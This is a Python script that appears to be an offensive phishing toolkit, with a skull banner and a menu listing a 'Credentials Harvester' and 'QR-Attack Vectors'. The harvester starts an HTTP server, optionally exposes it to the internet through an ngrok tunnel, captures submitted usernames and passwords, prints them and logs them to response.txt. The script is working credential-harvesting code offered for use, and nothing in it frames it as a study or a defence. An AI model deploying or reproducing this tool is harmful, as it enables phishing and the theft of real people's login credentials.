# Importing required packages
import http.server
import socketserver
import urllib.parse
from os import system
from subprocess import run
from pyngrok import ngrok

# def expose_local_server(PORT):
#     try:
#         run(['ngrok', 'http', str(PORT)])
#         pass
#     except FileNotFoundError:
#         print("Make Sure that NGROK was installed properly :-(")

def art():
    print("""
                                  :::!~!!!!!:.
                              .xUHWH!! !!?M88WHX:.
                            .X*#M@$!!  !X!M$$$$$$WWx:.
                           :!!!!!!?H! :!$!$$$$$$$$$$8X:
                          !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
                         :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
                         ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
                           !:~~~ .:!M"T#$$$$WX??#MRRMMM!
                           ~?WuxiW*`   `"#$$$$8!!!!??!!!
                         :X- M$$$$       `"T#$T~!8$WUXU~
                        :%`  ~#$$$m:        ~!~ ?$$$$$$
                      :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
            .....   -~~:<` !    ~?T#$$@@W@*?$$      /`
            W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
            #"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
            :::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
            .~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
            Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
            $R@i.~~ !     :   ~$$$$$B$$en:``
            ?MXT@Wx.~    :     ~"##*$$$$M~
        """)

def phishing(PORT):
  class CustomHandler(http.server.SimpleHTTPRequestHandler):

    def do_POST(self):
        
        if self.path == '/submit':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            parsed_data = urllib.parse.parse_qs(post_data)

            # Get the 'data' parameter from the parsed data
            data1 = parsed_data.get('usrname', [''])[0]
            data2 = parsed_data.get('passwd', [''])[0]    
            # Send the HTTP response
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            response = f"Received data: {data1},{data2}\n"
            print(f"Received Username:{data1} , and Password:{data2}")
            
            # self.wfile.write(response.encode())
            with open ('response.txt', 'a') as file:
                file.write(response)
                pass

            with open('feedback.html','rb') as file:
                self.wfile.write(file.read())
                pass

        else:
            return http.server.SimpleHTTPRequestHandler.do_POST(self)

  with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
      print(f"Serving at port {PORT}")
      try:
          httpd.serve_forever()
      except KeyboardInterrupt:
          print("\nServer stopped by the user.")

def main():
    system("clear")
    art()
    print("""
        1. Credentials Harvester.
        2. QR-Attack Vectors.
        3. Exit the application.
        """)
    mode = input("Enter the mode: ")
    if mode == "1":
        system("clear")
        PORT = int(input(" 1. Enter the port you want to use: "))
        tunnel = input("Do you want to expose to web (y/n): ")
        if tunnel == "y" or tunnel == "Y":
          public_url = ngrok.connect(f"http://localhost:{PORT}")
          print ("Public_URL: ",public_url)
          phishing(PORT)
          try:
              input("Press Enter To Exit")
          except KeyboardInterrupt:
              pass
          ngrok.disconnect(public_url)
          ngrok.kill()
          pass
        else:
            phishing(PORT)
main()
